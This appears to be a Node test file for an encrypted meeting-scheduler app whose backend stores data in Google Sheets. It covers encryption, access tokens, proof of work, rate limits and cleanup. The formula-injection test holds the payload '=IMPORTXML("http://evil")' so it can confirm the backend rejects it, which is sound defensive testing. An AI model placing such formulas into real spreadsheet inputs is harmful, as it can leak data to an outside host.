// Drives the browser client code (core.js + api.js) against the real Code.gs,
// loaded into the Apps Script shim.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as core from '../js/core.js';
import { createApi, openEvent } from '../js/api.js';
import { loadBackend } from '../dev/gas-shim.mjs';

const POW_BITS = 16;
const META = { title: 'Lab meeting', dates: ['2026-10-05', '2026-10-06'], start: 540, end: 720, step: 30, tz: 'America/Los_Angeles' };
const N = core.slotCount(META);

function setup() {
  const { gas, global: backend } = loadBackend();
  backend.setup();
  globalThis.fetch = async (url, opts = {}) => {
    let out;
    if (opts.method === 'POST') {
      // Anything other than a text/plain body would trigger a CORS preflight, which Apps Script rejects.
      assert.deepEqual(Object.keys(opts.headers), ['Content-Type']);
      assert.match(opts.headers['Content-Type'], /^text\/plain/);
      out = backend.doPost({ postData: { contents: opts.body } });
    } else {
      out = backend.doGet({ parameter: Object.fromEntries(new URL(url).searchParams) });
    }
    return { ok: true, status: 200, json: async () => JSON.parse(out.getContent()) };
  };
  return { gas, backend, api: createApi('https://script.example/exec') };
}

const bits = (...on) => Array.from({ length: N }, (_, i) => on.includes(i) ? 1 : 0);
const post = (backend, body) => JSON.parse(backend.doPost({ postData: { contents: JSON.stringify(body) } }).getContent());

async function newEvent(api) {
  const ev = await core.deriveEvent(core.newEventKey());
  await api.create(ev, META, POW_BITS);
  return ev;
}

async function respond(api, ev, name, password, on) {
  const secret = await core.participantSecret(ev, name, password);
  return api.respond(ev, secret, { name, avail: core.packBits(on) });
}

test('create, respond, update, read back', async () => {
  const { gas, api } = setup();
  const ev = await newEvent(api);

  await respond(api, ev, 'Ada', '', bits(0, 1));
  await respond(api, ev, 'ada ', '', bits(2));        // same person: overwrites
  await respond(api, ev, 'Grace', 'pw', bits(2, 3));
  await respond(api, ev, 'Grace', 'other', bits(5));  // wrong password: separate row, cannot overwrite

  const { meta, responses } = await openEvent(ev, await api.load(ev));
  assert.deepEqual(meta, META);
  assert.equal(responses.length, 3);
  const byName = Object.groupBy(responses, r => r.name);
  assert.deepEqual(byName['ada'][0].avail, bits(2));
  assert.deepEqual(byName['Grace'].map(r => r.avail).sort(), [bits(2, 3), bits(5)].sort());

  // The server only ever saw ciphertext.
  const stored = JSON.stringify([...gas.sheets.values()].map(s => s.cells));
  assert.ok(!stored.includes('Lab meeting') && !stored.includes('Ada') && !stored.includes('Grace'));
});

test('writes require the link-derived token', async () => {
  const { backend, api } = setup();
  const ev = await newEvent(api);
  const stranger = await core.deriveEvent(core.newEventKey());
  const secret = await core.participantSecret(ev, 'x', '');
  const blob = await core.encryptJSON(ev, 'response', { name: 'x', avail: core.packBits(bits()) });
  const res = post(backend, { action: 'respond', event: ev.id, token: stranger.token, psecret: secret, blob });
  assert.deepEqual(res, { ok: false, error: 'event not found' });
});

test('event creation requires proof of work', async () => {
  const { backend } = setup();
  const ev = await core.deriveEvent(core.newEventKey());
  let nonce = 0;
  while (true) {  // find a nonce that does NOT meet the target
    const h = core.fromB64url(await core.sha256B64(`${ev.id}:${nonce}`));
    if (core.leadingZeroBits(h) < POW_BITS) break;
    nonce++;
  }
  const res = post(backend, { action: 'create', event: ev.id, tokenHash: ev.tokenHash, meta: 'abc', nonce });
  assert.deepEqual(res, { ok: false, error: 'proof of work failed' });
});

test('rejects malformed input, including formula injection', async () => {
  const { backend, api } = setup();
  const ev = await newEvent(api);
  const secret = await core.participantSecret(ev, 'x', '');
  for (const blob of ['=IMPORTXML("http://evil")', 'a b', 'x'.repeat(4001), '']) {
    const res = post(backend, { action: 'respond', event: ev.id, token: ev.token, psecret: secret, blob });
    assert.equal(res.ok, false, blob.slice(0, 20));
  }
  assert.equal(post(backend, { action: 'nope' }).ok, false);
  assert.equal(JSON.parse(backend.doPost({ postData: { contents: 'not json' } }).getContent()).ok, false);
  assert.equal(JSON.parse(backend.doGet({ parameter: {} }).getContent()).ok, false);
});

test('per-event rate limit', async () => {
  const { api } = setup();
  const ev = await newEvent(api);
  for (let i = 0; i < 90; i++) await respond(api, ev, 'Ada', '', bits(i % N));
  await assert.rejects(respond(api, ev, 'Ada', '', bits()), /too many requests/);
});

test('requests without the link do not use up the rate limit', async () => {
  const { backend, api } = setup();
  const ev = await newEvent(api);
  const fake = await core.deriveEvent(core.newEventKey());
  const blob = await core.encryptJSON(fake, 'response', { name: 'x', avail: 'AA' });
  for (let i = 0; i < 400; i++) {
    // Bogus token for a real event, and a made-up event entirely.
    assert.equal(post(backend, { action: 'respond', event: ev.id, token: fake.token, psecret: fake.token, blob }).ok, false);
    assert.equal(post(backend, { action: 'respond', event: fake.id, token: fake.token, psecret: fake.token, blob }).ok, false);
  }
  await respond(api, ev, 'Ada', '', bits(1));
  const { responses } = await openEvent(ev, await api.load(ev));
  assert.deepEqual(responses.map(r => r.name), ['Ada']);
});

test('unreadable rows are skipped, not fatal', async () => {
  const { gas, api } = setup();
  const ev = await newEvent(api);
  await respond(api, ev, 'Ada', '', bits(1));
  // Someone with the link writes a response for a different grid size.
  const secret = await core.participantSecret(ev, 'Mallory', '');
  await api.respond(ev, secret, { name: 'Mallory', avail: core.packBits([1, 1, 1]) });
  await api.respond(ev, await core.participantSecret(ev, 'M2', ''), { name: 'M2'.repeat(100), avail: core.packBits(bits()) });
  const { responses } = await openEvent(ev, await api.load(ev));
  assert.deepEqual(responses.map(r => r.name), ['Ada']);
  assert.equal(gas.sheets.get('responses').getLastRow(), 4);
});

test('sheet grows past its row limit and keeps IDs as text', async () => {
  const { gas, backend, api } = setup();
  gas.sheets.get('responses').maxRows = 2;
  const ev = await newEvent(api);
  for (const name of ['a', 'b', 'c', 'd']) await respond(api, ev, name, '', bits());
  const { responses } = await openEvent(ev, await api.load(ev));
  assert.equal(responses.length, 4);
  // Sanity check that the shim's coercion is live, so the test above means something.
  const scratch = gas.sheets.get('events');
  scratch.getRange(999, 1, 1, 1).setValues([['1e5']]);
  assert.equal(scratch.getRange(999, 1).getValues()[0][0], 100000);
  backend.selfTest();
});

test('cleanup drops stale events and their responses', async () => {
  const { gas, backend, api } = setup();
  const stale = await newEvent(api);
  const fresh = await newEvent(api);
  await respond(api, stale, 'a', '', bits());
  await respond(api, fresh, 'b', '', bits());
  gas.sheets.get('events').getRange(2, 5).setValue(Date.now() - 91 * 864e5);
  backend.cleanup();
  await assert.rejects(api.load(stale), /event not found/);
  const { responses } = await openEvent(fresh, await api.load(fresh));
  assert.deepEqual(responses.map(r => r.name), ['b']);
  assert.equal(gas.sheets.get('responses').getLastRow(), 2);
});
